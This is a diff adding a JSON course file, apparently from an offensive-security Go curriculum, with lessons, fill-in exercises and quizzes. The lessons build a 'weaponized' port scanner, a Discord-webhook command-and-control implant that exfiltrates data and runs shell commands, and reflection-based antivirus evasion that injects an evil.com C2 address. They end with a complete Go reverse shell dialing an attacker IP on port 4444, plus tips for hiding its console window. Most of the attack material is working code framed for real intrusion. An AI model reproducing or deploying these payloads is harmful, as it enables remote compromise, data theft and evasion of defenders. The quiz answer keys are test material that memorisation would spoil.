@@ -1,0 +1,342 @@
+{
+"m2-3": {
+"steps": [
+{
+"type": "concept",
+"heading": "The Speed Limit",
+"body": "A synchronous port scanner checks port 1, waits for a timeout, checks port 2, waits, and so on. Scanning 65,535 ports this way takes hours. It's loud, slow, and completely unacceptable for offensive operations.\n\nTo build a weaponized scanner, we need concurrency. We need to fire off thousands of probes simultaneously and simply listen for the responses. Go's runtime was literally built for this exact problem."
+},
+{
+"type": "concept",
+"heading": "Herding Goroutines",
+"body": "When you spawn a goroutine using `go checkPort(80)`, it detaches from the main execution thread. If your main `func main()` reaches its end, the program exits immediately, brutally killing all your background goroutines before they finish scanning.\n\nTo prevent this, we use a `sync.WaitGroup`. It's a simple counter. We add 1 to the counter before launching a scan, and the goroutine calls `Done()` when it finishes. The main thread calls `Wait()` to block execution until the counter hits zero."
+},
+{
+"type": "code",
+"heading": "The WaitGroup",
+"body": "Here is the fundamental pattern for safely executing hundreds of concurrent tasks without letting the program exit prematurely.",
+"code": "package main\nimport (\n    "fmt"\n    "sync"\n    "time"\n)\n\nfunc scanStub(port int, wg *sync.WaitGroup) {\n    // Defer wg.Done() ensures the counter decreases even if this function crashes\n    defer wg.Done()\n    time.Sleep(10 * time.Millisecond) // Simulating network latency\n    fmt.Printf("[+] Port %d scanned\n", port)\n}\n\nfunc main() {\n    var wg sync.WaitGroup\n    \n    for i := 1; i <= 10; i++ {\n        // Increment the counter BEFORE launching the goroutine\n        wg.Add(1)\n        go scanStub(i, &wg)\n    }\n    \n    // Block here until wg.Done() has been called 10 times\n    wg.Wait()\n    fmt.Println("[*] All scans completed.")\n}"
+},
+{
+"type": "code_practice",
+"heading": "Increment Counter",
+"context": "Use the "wg.Add" method to add 1 to the WaitGroup counter before launching the routine.",
+"code_before": "for port := 1; port <= 1024; port++ {\n    // Register the upcoming task\n    ",
+"code_after": "(1)\n    go probe(port, &wg)\n}",
+"correct_answer": "wg.Add"
+},
+{
+"type": "code",
+"heading": "Gathering Intel",
+"body": "We don't just want to print output; we need to collect open ports. Goroutines cannot safely write to the same slice at the same time (Race Condition). We use a `chan` (Channel) to safely funnel results back to the main thread.",
+"code": "package main\nimport ("fmt"; "sync"; "net")\n\nfunc worker(port int, wg *sync.WaitGroup, results chan int) {\n    defer wg.Done()\n    address := fmt.Sprintf("127.0.0.1:%d", port)\n    // A quick dial with no timeout for demonstration\n    conn, err := net.Dial("tcp", address)\n    if err == nil {\n        conn.Close()\n        // Send the open port integer INTO the channel\n        results <- port \n    }\n}\n\nfunc main() {\n    var wg sync.WaitGroup\n    // Create a buffered channel that can hold 100 integers\n    results := make(chan int, 100)\n    \n    // Launch 100 workers\n    for i := 1; i <= 100; i++ {\n        wg.Add(1)\n        go worker(i, &wg, results)\n    }\n    \n    wg.Wait()      // Wait for all workers to finish\n    close(results) // Close the channel so we can iterate over it safely\n    \n    for p := range results {\n        fmt.Printf("[!] Port %d is OPEN\n", p)\n    }\n}"
+},
+{
+"type": "code_practice",
+"heading": "Send to Channel",
+"context": "Send the open `port` variable into the `results` channel using the "<-" operator.",
+"code_before": "if connection_successful {\n    // Transmit the finding back to the main thread\n    results ",
+"code_after": " port\n}",
+"correct_answer": "<-"
+},
+{
+"type": "concept",
+"heading": "The Open File Limit",
+"body": "If you try to scan 65,535 ports concurrently by spawning 65,535 goroutines, Go handles the memory fine, but your Operating System will throw a 'too many open files' error and crash your sockets.\n\nA true weaponized scanner uses a 'Worker Pool'. You spin up exactly 100 goroutines (workers), and feed them 65,535 ports through a single job channel. As soon as a worker finishes a port, it grabs the next one from the channel. This maxes out your network interface without angering the OS."
+},
+{
+"type": "code_practice",
+"heading": "Close the Funnel",
+"context": "Use the "close" function on the `results` channel to signal that no more data will be sent.",
+"code_before": "wg.Wait()\n// Securely shut down the channel\n",
+"code_after": "(results)\n\nfor open_port := range results {\n    println(open_port)\n}",
+"correct_answer": "close"
+},
+{
+"type": "quiz",
+"heading": "Knowledge Check",
+"question": "You execute a Go port scanner that spawns 100 goroutines, but the program exits immediately without printing any results. What is the most likely cause?",
+"options": [
+"The target firewall blocked all ICMP ping requests.",
+"The main thread exited before calling wg.Wait() to block for the goroutines.",
+"Go's garbage collector deleted the goroutines to save memory.",
+"The OS blocked the sockets due to a file descriptor limit."
+],
+"correct": 1,
+"hint": "Remember the fundamental rule: when the main function returns, the program dies instantly, regardless of background activity."
+}
+]
+},
+"m2-4": {
+"steps": [
+{
+"type": "concept",
+"heading": "Hiding in the Noise",
+"body": "Command and Control (C2) is how you talk to your malware. If your payload reaches out to an unknown IP over port 4444, the Blue Team will instantly flag it. To survive, you must blend in.\n\nDiscord C2 uses Discord's legitimate API endpoints as a proxy. Your malware sends HTTP requests to discord.com. To the firewall, it just looks like a user sending chat messages. The payload pulls commands from a channel, executes them locally, and posts the output back. It's Domain Fronting on a budget."
+},
+{
+"type": "concept",
+"heading": "The API Webhook",
+"body": "To exfiltrate data to Discord, the easiest method is a Webhook. It's a unique URL that accepts a JSON payload and automatically posts it to a specific channel.\n\nBecause Go has a phenomenal built-in `net/http` package and native JSON marshaling, building a lightweight function to shoot data out of a restrictive network via a Webhook takes fewer than 15 lines of code."
+},
+{
+"type": "code",
+"heading": "Webhooks in Go",
+"body": "Here is how an implant checks in to the C2 server using a Discord Webhook.",
+"code": "package main\nimport (\n    "bytes"\n    "encoding/json"\n    "net/http"\n)\n\nfunc sendCheckIn(webhookURL string, message string) {\n    // Create an anonymous struct matching Discord's required JSON schema\n    payload := map[string]string{"content": message}\n    \n    // Encode the struct into raw JSON bytes\n    jsonPayload, _ := json.Marshal(payload)\n    \n    // Craft the HTTP POST request\n    req, _ := http.NewRequest("POST", webhookURL, bytes.NewBuffer(jsonPayload))\n    req.Header.Set("Content-Type", "application/json")\n    \n    // Execute the request via the default HTTP client\n    client := &http.Client{}\n    resp, err := client.Do(req)\n    if err == nil {\n        defer resp.Body.Close()\n    }\n}"
+},
+{
+"type": "code_practice",
+"heading": "Set the Method",
+"context": "Supply the literal string ""POST"" as the first argument to specify the HTTP method.",
+"code_before": "// Initialize the outbound webhook request\nreq, err := http.NewRequest(",
+"code_after": ", hookURL, bytes.NewBuffer(data))",
+"correct_answer": ""POST""
+},
+{
+"type": "code",
+"heading": "Executing System Commands",
+"body": "Once the implant pulls a command from the Discord channel (via a GET request), it needs to actually run it on the host OS.",
+"code": "package main\nimport (\n    "fmt"\n    "os/exec"\n)\n\nfunc runCommand(command string) string {\n    // os/exec allows us to spawn subprocesses easily\n    // We invoke a shell to handle complex commands with arguments\n    cmd := exec.Command("sh", "-c", command)\n    \n    // Output() runs the command and returns its Standard Output as bytes\n    out, err := cmd.Output()\n    if err != nil {\n        // If the command fails (e.g. "ls -z"), return the error text\n        return fmt.Sprintf("Execution failed: %v", err)\n    }\n    \n    // Cast the raw byte output back into a human-readable string\n    return string(out)\n}"
+},
+{
+"type": "code_practice",
+"heading": "Spawn Subprocess",
+"context": "Use the "exec.Command" function to prepare the `whoami` command for execution.",
+"code_before": "import "os/exec"\n\nfunc checkPrivs() []byte {\n    // Prepare the system command\n    cmd := ",
+"code_after": "("whoami")\n    out, _ := cmd.Output()\n    return out\n}",
+"correct_answer": "exec.Command"
+},
+{
+"type": "concept",
+"heading": "OpSec and Burnout",
+"body": "Discord actively hunts for C2 bots. If your implant polls a channel every 1 second, Discord will rate-limit you and nuke the account.\n\nA professional implant introduces 'Jitter'. Instead of sleeping exactly 60 seconds between check-ins, it sleeps anywhere from 45 to 75 seconds. This randomized heartbeat breaks rigid network signatures. Furthermore, hardcoding a Discord API token directly into your binary means the moment the Blue Team reverse-engineers your executable, your entire C2 infrastructure is burned."
+},
+{
+"type": "code_practice",
+"heading": "Execute and Capture",
+"context": "Use the "cmd.Output()" method to run the command and capture its standard out.",
+"code_before": "cmd := exec.Command("netstat", "-an")\n// Execute the binary and catch the results\nresults, err := ",
+"code_after": "\nif err != nil { return nil }",
+"correct_answer": "cmd.Output()"
+},
+{
+"type": "quiz",
+"heading": "Knowledge Check",
+"question": "Why is a Discord Webhook ideal for exfiltrating data out of a heavily restricted corporate environment?",
+"options": [
+"It uses a custom UDP protocol that bypasses traditional stateful firewalls.",
+"It relies on standard HTTPS traffic to a highly trusted domain, blending into regular web usage.",
+"It automatically encrypts the data using AES-256 before the HTTP layer.",
+"It establishes a persistent reverse TCP shell directly to the Discord servers."
+],
+"correct": 1,
+"hint": "Think about what the corporate firewall sees when it inspects the traffic destination."
+}
+]
+},
+"m2-5": {
+"steps": [
+{
+"type": "concept",
+"heading": "Duck Typing in Go",
+"body": "Go doesn't have classes or inheritance. Instead, it relies on Interfaces. An interface is just a contract: a list of methods a type must have.\n\nIf it walks like a duck and quacks like a duck, it's a duck. If you define an interface that requires a `Fire()` method, any struct in your program that possesses a `Fire()` method automatically satisfies that interface. You don't have to declare `implements` like in Java. This implicit satisfaction allows for incredibly flexible, decoupled code."
+},
+{
+"type": "concept",
+"heading": "The Empty Wildcard",
+"body": "The most powerful (and dangerous) interface is the empty interface: `interface{}`. Because it requires zero methods, *every single type* in Go satisfies it. Integers, strings, massive custom structs—they can all be passed into a variable of type `interface{}`.\n\nThis is how `fmt.Println` accepts anything you throw at it. But to actually use the data hidden inside an empty interface, you have to rip off the mask and tell the compiler what the underlying type truly is. This is a Type Assertion."
+},
+{
+"type": "code",
+"heading": "Defining the Contract",
+"body": "Here we define an interface and two entirely different structs that both satisfy it implicitly.",
+"code": "package main\nimport "fmt"\n\n// Any type that has an Execute() method returning a string is a Payload\ntype Payload interface {\n    Execute() string\n}\n\ntype WindowsDropper struct { URL string }\n// WindowsDropper satisfies Payload\nfunc (w WindowsDropper) Execute() string { \n    return "Downloading from " + w.URL \n}\n\ntype LinuxWiper struct { TargetDir string }\n// LinuxWiper also satisfies Payload\nfunc (l LinuxWiper) Execute() string { \n    return "Wiping " + l.TargetDir \n}\n\n// This function accepts ANYTHING that fits the Payload contract\nfunc triggerExploit(p Payload) {\n    fmt.Println("[*] Firing:", p.Execute())\n}"
+},
+{
+"type": "code_practice",
+"heading": "Define Interface",
+"context": "Declare a type named `Module` using the "interface" keyword to establish the contract.",
+"code_before": "// Define the expected behavior for all plugins\ntype Module ",
+"code_after": " {\n    Run() bool\n    Cleanup()\n}",
+"correct_answer": "interface"
+},
+{
+"type": "code",
+"heading": "Type Assertions",
+"body": "When data is trapped inside an `interface{}`, we use the `.(Type)` syntax to assert its true identity safely.",
+"code": "package main\nimport "fmt"\n\nfunc processUnknownData(data interface{}) {\n    // UNSAFE assertion: If data is NOT a string, the program violently Panics\n    // str := data.(string)\n    \n    // SAFE assertion: We get the value AND a boolean 'ok' flag\n    // If it fails, ok is false and the program survives\n    str, ok := data.(string)\n    if ok {\n        fmt.Println("[+] It's a string:", len(str), "bytes long")\n        return\n    }\n    \n    num, ok := data.(int)\n    if ok {\n        fmt.Println("[+] It's an integer:", num * 2)\n        return\n    }\n    \n    fmt.Println("[-] Unknown data type received.")\n}"
+},
+{
+"type": "code_practice",
+"heading": "Safe Assertion",
+"context": "Use the safe assertion pattern to assign the boolean success flag to "ok".",
+"code_before": "var mystery interface{} = "C2_ACK"\n\n// Extract the string safely\nmessage, ",
+"code_after": " := mystery.(string)\nif ok {\n    println(message)\n}",
+"correct_answer": "ok"
+},
+{
+"type": "concept",
+"heading": "The Type Switch",
+"body": "When building an implant that parses JSON tasks from a C2 server, you often don't know what data type to expect for the `arguments` field. It could be an integer (sleep time), a string (command), or a nested array.\n\nInstead of writing ten separate safe assertions, Go provides the Type Switch. It allows you to cleanly branch your logic based on the dynamic type hidden within the interface."
+},
+{
+"type": "code_practice",
+"heading": "Type Switch Header",
+"context": "Begin the type switch by using the "type" keyword inside the assertion syntax.",
+"code_before": "func handleC2(arg interface{}) {\n    // Route logic based on the underlying type\n    switch v := arg.(",
+"code_after": ") {\n        case string:\n            println("Executing: ", v)\n        case int:\n            println("Sleeping for: ", v)\n    }\n}",
+"correct_answer": "type"
+},
+{
+"type": "quiz",
+"heading": "Knowledge Check",
+"question": "You write the code `length := input.(int)`. At runtime, the `input` variable actually contains a string. What happens?",
+"options": [
+"The integer length of the string is safely returned.",
+"The program converts the string to its binary representation.",
+"The compiler throws a warning but continues execution.",
+"The program panics and crashes instantly."
+],
+"correct": 3,
+"hint": "An assertion without the `ok` boolean flag is a hard demand. If the demand is not met, the runtime takes drastic action."
+}
+]
+},
+"m2-6": {
+"steps": [
+{
+"type": "concept",
+"heading": "The Black Arts",
+"body": "Reflection is a program's ability to examine, modify, and dissect its own structure and variables at runtime. It breaks the fundamental rules of compiled languages.\n\nNormally, when Go compiles, it strips away variable names and enforces strict types. Reflection uses the `reflect` package to peer directly into memory, allowing you to ask 'What fields does this unknown struct have?' or 'Call whatever function this string names.' It's slow, dangerous, and incredibly powerful for writing dynamic tools."
+},
+{
+"type": "concept",
+"heading": "Type vs Value",
+"body": "Reflection revolves around two core concepts: `reflect.Type` and `reflect.Value`. \n\nType tells you *what* the thing is (e.g., 'This is a struct with three fields'). Value tells you *what data* it holds (e.g., 'The first field contains the string admin'). To do anything useful, you usually extract the Value, inspect the Type to understand its shape, and then dynamically iterate through its fields."
+},
+{
+"type": "code",
+"heading": "Inspecting Unknown Structs",
+"body": "Here we use reflection to dynamically dump the names and values of any struct passed to us, without knowing what it is beforehand.",
+"code": "package main\nimport ("fmt"; "reflect")\n\ntype TargetInfo struct {\n    IP   string\n    Port int\n}\n\nfunc InspectData(mystery interface{}) {\n    // Extract the reflection Value object\n    v := reflect.ValueOf(mystery)\n    \n    // Ensure it's actually a struct to prevent a panic\n    if v.Kind() != reflect.Struct {\n        fmt.Println("Not a struct!")\n        return\n    }\n    \n    // Iterate through all fields dynamically\n    for i := 0; i < v.NumField(); i++ {\n        fieldValue := v.Field(i)\n        // Type() gives us the struct schema, so we can get the field's Name\n        fieldName := v.Type().Field(i).Name\n        fmt.Printf("[+] Field: %s | Value: %v\n", fieldName, fieldValue.Interface())\n    }\n}"
+},
+{
+"type": "code_practice",
+"heading": "Extract the Value",
+"context": "Use the "reflect.ValueOf" function to extract the reflection value object from `data`.",
+"code_before": "import "reflect"\n\nfunc analyze(data interface{}) {\n    // Grab the dynamic value object\n    val := ",
+"code_after": "(data)\n    println(val.Kind().String())\n}",
+"correct_answer": "reflect.ValueOf"
+},
+{
+"type": "code",
+"heading": "Runtime Modification",
+"body": "Reading is safe. Writing requires pointers. If you want to modify a struct field using reflection, you must pass a pointer, dereference it via `.Elem()`, and check if it `CanSet()`.",
+"code": "package main\nimport ("fmt"; "reflect")\n\ntype Config struct { Server string }\n\nfunc HijackConfig(c interface{}) {\n    // We MUST use ValueOf on a pointer, then call Elem() to get the actual struct\n    v := reflect.ValueOf(c).Elem()\n    \n    // Find the field by its exact string name\n    field := v.FieldByName("Server")\n    \n    // Before writing, always ensure the field is exported (capitalized) and settable\n    if field.IsValid() && field.CanSet() {\n        if field.Kind() == reflect.String {\n            // Dynamically inject our malicious C2 address\n            field.SetString("[http://evil.com/c2](https://www.google.com/search?q=http://evil.com/c2)")\n            fmt.Println("[*] Config hijacked dynamically.")\n        }\n    }\n}\n// main() { cfg := Config{"localhost"}; HijackConfig(&cfg) }"
+},
+{
+"type": "code_practice",
+"heading": "Check Write Access",
+"context": "Use the "CanSet()" method to verify the field is modifiable before attempting to overwrite it.",
+"code_before": "targetField := v.FieldByName("AuthToken")\n// Always check if reflection is allowed to modify this memory\nif targetField.IsValid() && targetField.",
+"code_after": " {\n    targetField.SetString("Pwned")\n}",
+"correct_answer": "CanSet()"
+},
+{
+"type": "concept",
+"heading": "The Evader's Toolkit",
+"body": "Why endure the headache of reflection? Evasion.\n\nStatic analysis tools (like Antivirus) map out function calls and string references. If you hardcode a call to `syscall.VirtualAlloc`, the AV flags it instantly. By using reflection to dynamically construct the function name at runtime, looking up the system call from memory, and invoking it blindly, you break the static call graph. The AV sees an opaque reflection blob instead of a known malware pattern."
+},
+{
+"type": "code_practice",
+"heading": "Dereference Pointer",
+"context": "Use the "Elem()" method to dereference the pointer and access the underlying struct.",
+"code_before": "// ptr is a pointer to a struct. We must dereference it.\nval := reflect.ValueOf(ptr).",
+"code_after": "\nfield := val.Field(0)",
+"correct_answer": "Elem()"
+},
+{
+"type": "quiz",
+"heading": "Knowledge Check",
+"question": "You attempt to dynamically modify a struct field named `password` using `field.SetString(\"root\")`, but the program panics. What is the most likely cause?",
+"options": [
+"Reflection cannot modify strings, only integers.",
+"You forgot to import the 'unsafe' package.",
+"The field name is unexported (lowercase), making it read-only to reflection.",
+"The garbage collector locked the variable."
+],
+"correct": 2,
+"hint": "In Go, visibility and access control are determined by whether the first letter of a field or function is capitalized."
+}
+]
+},
+"m2-7": {
+"steps": [
+{
+"type": "concept",
+"heading": "The Final Bridge",
+"body": "A reverse shell is the ultimate goal of an initial breach. It forces the victim machine to reach out to the attacker and hand over a terminal interface.\n\nTo build one, you only need two components: a network socket reaching out to the attacker, and a local command-line interpreter (like `/bin/sh` or `cmd.exe`). The magic lies entirely in bridging them together, turning network packets into keystrokes."
+},
+{
+"type": "concept",
+"heading": "Standard Streams",
+"body": "Every process in Linux/Windows has three standard streams: Stdin (Input), Stdout (Output), and Stderr (Errors).\n\nIn Go, a TCP connection (`net.Conn`) implements both the `io.Reader` and `io.Writer` interfaces. This means we can violently rip the input/output streams away from the local terminal and wire them directly into the TCP socket. The shell reads from the socket thinking it's a keyboard, and writes to the socket thinking it's a monitor."
+},
+{
+"type": "code",
+"heading": "The Core Payload",
+"body": "In just a few lines of Go, we establish the outward connection and spawn the shell process.",
+"code": "package main\nimport (\n    "net"\n    "os/exec"\n)\n\nfunc main() {\n    // 1. Dial back to the attacker's listening Netcat server\n    conn, err := net.Dial("tcp", "10.10.10.50:4444")\n    if err != nil {\n        return // Fail silently if the attacker isn't listening\n    }\n    defer conn.Close()\n    \n    // 2. Prepare the shell process. \n    // Use "/bin/sh" for Linux, or "cmd.exe" for Windows\n    cmd := exec.Command("/bin/sh", "-i")\n    \n    // We haven't executed it yet. We need to wire the pipes first.\n}"
+},
+{
+"type": "code_practice",
+"heading": "Prepare the Shell",
+"context": "Use `exec.Command` to prepare the Linux shell "/bin/sh" with the interactive flag "-i".",
+"code_before": "// Set up the interactive interpreter\ncmd := exec.Command(",
+"code_after": ")\n// Wiring comes next",
+"correct_answer": ""/bin/sh", "-i""
+},
+{
+"type": "code",
+"heading": "Wiring the Pipes",
+"body": "Here we perform the actual stream redirection, mapping the process I/O directly to the network connection before launching it.",
+"code": "package main\nimport ("net"; "os/exec")\n\nfunc triggerShell(conn net.Conn) {\n    cmd := exec.Command("/bin/sh", "-i")\n    \n    // 3. Wire Standard Input: Keyboard commands come FROM the socket\n    cmd.Stdin = conn\n    \n    // 4. Wire Standard Output: Command results go TO the socket\n    cmd.Stdout = conn\n    \n    // 5. Wire Standard Error: Error messages go TO the socket\n    // If you forget this, typos in the shell won't show up for the attacker!\n    cmd.Stderr = conn\n    \n    // 6. Start the process and wait for it to finish (which blocks forever)\n    cmd.Run()\n}"
+},
+{
+"type": "code_practice",
+"heading": "Wire Output",
+"context": "Assign the network connection `conn` to the command's Standard Output stream using "cmd.Stdout".",
+"code_before": "cmd.Stdin = conn\n// Pipe the command results directly out to the attacker\n",
+"code_after": " = conn\ncmd.Stderr = conn",
+"correct_answer": "cmd.Stdout"
+},
+{
+"type": "concept",
+"heading": "Cross-Compilation Magic",
+"body": "Go's true power is compilation. You can write your reverse shell on a Linux box, and compile it for a Windows target instantly using environment variables: `GOOS=windows GOARCH=amd64 go build -o shell.exe`.\n\nHowever, by default, running a compiled Windows executable pops up an ugly black command prompt window, instantly alerting the user. To make the executable run invisibly in the background, you compile it with a specific linker flag: `go build -ldflags -H=windowsgui`. Stealth achieved."
+},
+{
+"type": "code_practice",
+"heading": "Execute the Shell",
+"context": "Use the "cmd.Run()" method to execute the shell and block until the connection drops.",
+"code_before": "cmd.Stdin = conn\ncmd.Stdout = conn\ncmd.Stderr = conn\n\n// Fire the payload and block execution\n",
+"code_after": "",
+"correct_answer": "cmd.Run()"
+},
+{
+"type": "quiz",
+"heading": "Knowledge Check",
+"question": "Why is it critical to route `cmd.Stderr` to the network socket in a reverse shell payload?",
+"options": [
+"It encrypts the traffic to bypass deep packet inspection.",
+"Without it, commands typed incorrectly by the attacker will fail silently on their end, making the shell incredibly frustrating to use.",
+"It prevents the host operating system from logging the commands to the bash history file.",
+"It guarantees that the process runs with root/administrator privileges."
+],
+"correct": 1,
+"hint": "Think about what happens in a normal terminal when you type 'lss' instead of 'ls'."
+}
+]
+}
+}
